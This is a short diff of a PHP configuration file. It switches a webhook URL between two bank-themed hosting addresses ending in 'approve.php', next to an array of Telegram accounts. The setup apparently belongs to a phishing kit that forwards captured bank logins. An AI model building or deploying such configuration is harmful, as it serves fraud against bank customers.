@@ -25,5 +25,5 @@ $telegram_accounts = [
 
 ];
 
-$webhook_url = 'https://mercantilcreditos.cleverapps.io/approve.php';
+$webhook_url = 'https://mercantilpromos.up.railway.app/approve.php';
 ?>
